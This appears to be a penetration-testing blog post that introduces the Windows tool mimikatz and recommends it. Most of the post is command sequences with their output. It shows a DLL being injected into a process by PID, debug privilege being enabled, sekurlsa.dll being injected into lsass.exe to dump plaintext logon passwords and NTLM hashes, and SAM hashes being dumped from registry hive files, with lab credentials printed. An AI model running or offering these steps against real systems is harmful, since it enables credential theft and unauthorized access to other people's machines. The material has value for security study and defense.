@@ -1,0 +1,122 @@
+
+An interesting tool for your SwissKnife.
+
+
+
+
+Hi folks, 
+
+my past weeks have been quite intensive and busy, unfortunately next weeks seem to follow the same pattern... I am going to travel between conferences and meetings since early April, this could have some influence in my posting frequency. Said that, today I'd like to share a pretty nice tool pointed me out from a student of mine called mimikatz . This windows specific tool helps penetration testers in different ways, specifically it helps pen testers in finding clear text passwords of users logged on windows users and injecting libraries into processes. The author seems to be a french guy who posted examples and test-cases in french language. I am not a native french speaker so I am not going to describe every mimikatz feature (since I could merely understand the one I am going to describe), but rather I am going to describe the ones I believe to be more interesting for pen testers. 
+
+
+
+mimikatz::inject. This is the inject functionality implemented in mimikats framework. The inject parameter takes the PID and the library to inject as input parameters. The following example is injecting the kelloworld.dll into the process having PID 3256 which happens to be Microsoft Word processor.
+
+mimikatz # inject::pid 3256 kelloworld.dll 
+Attente de connexion du client... 
+Serveur connecté à un client !
+Message du processus : 
+Bienvenue dans un processus distant
+                        Gentil Kiwi 
+
+mimikatz # @ping 
+pong 
+
+ mimikatz # @helloworld
+
+
+
+
+
+
+
+The following example shows hot to use sekurlsa.dll to get windows logon plain text passwords:
+
+
+
+mimikatz 1.0 x86 (pre-alpha)    /* Traitement du Kiwi */ 
+
+mimikatz # privilege::debug 
+
+Demande d'ACTIVATION du privilège : SeDebugPrivilege : OK 
+
+
+
+mimikatz # inject::process lsass.exe sekurlsa.dll 
+
+PROCESSENTRY32(lsass.exe).th32ProcessID = 488 
+
+Attente de connexion du client... 
+
+Serveur connecté à un client ! 
+
+Message du processus : 
+
+Bienvenue dans un processus distant
+                        Gentil Kiwi 
+
+
+
+SekurLSA : librairie de manipulation des données de sécurités dans LSASS 
+
+
+
+mimikatz # @getLogonPasswords 
+
+
+
+Authentification Id         : 0;434898 
+
+Package d'authentification  : NTLM 
+
+Utilisateur principal       : Gentil User 
+
+Domaine d'authentification  : vm-w7-ult 
+
+msv1_0 :        lm{ e52cac67419a9a224a3b108f3fa6cb6d }, ntlm{ 8846f7eaee8fb117ad06bdd830b7586c }
+
+wdigest :       password 
+
+tspkg :         password 
+
+
+
+Authentification Id         : 0;269806 
+
+Package d'authentification  : NTLM 
+
+Utilisateur principal       : Gentil Kiwi 
+
+Domaine d'authentification  : vm-w7-ult 
+
+msv1_0 :        lm{ d0e9aee149655a6075e4540af1f22d3b }, ntlm{ cc36cf7a8514893efccd332446158b1a }
+        wdigest :       waza1234/ 
+
+ tspkg :         waza1234/
+
+This actually makes me reflecting on windows memory management. Since there is no the need of having plaintext passwords in LSASS, indeed it uses hashes and not plain text passwords, it means that the plain text passwords are stuck on the memory in the original input holding variable. This makes me thinking that no memory cleaners are used in windows logon. I am not sure 100%, I could be wrong but if you follows my brainstorming it could be easily this way, which actually is a quite important mistake which allows programs to read logon passwords from memory (as actually is working in this way! ).
+
+The following example shows how to use the hashes functionality to dump SAM hashes:
+
+mimikatz # samdump::hashes z:\windows\system32\config\system z:\windows\system32\config\sam
+
+Ordinateur : VM-W2K8R2-ENT-X 
+BootKey    : c4ed5743f54e4f1fdc6cca89723335ce 
+
+Rid  : 500 
+User : Administrateur 
+LM   : 
+NTLM : cc36cf7a8514893efccd332446158b1a 
+Rid  : 501 
+User : Invité 
+LM   : 
+NTLM :
+
+
+You will find this interesting tool here (it happens to be a french site, but google translator does its job very well). Finally I like and I do suggest to have in your own swiss-knife this interesting tool specially if you need to inject your own DLL into specific PID getting PID's rights. Have a nice hunting !
+
+
+
+
+
+
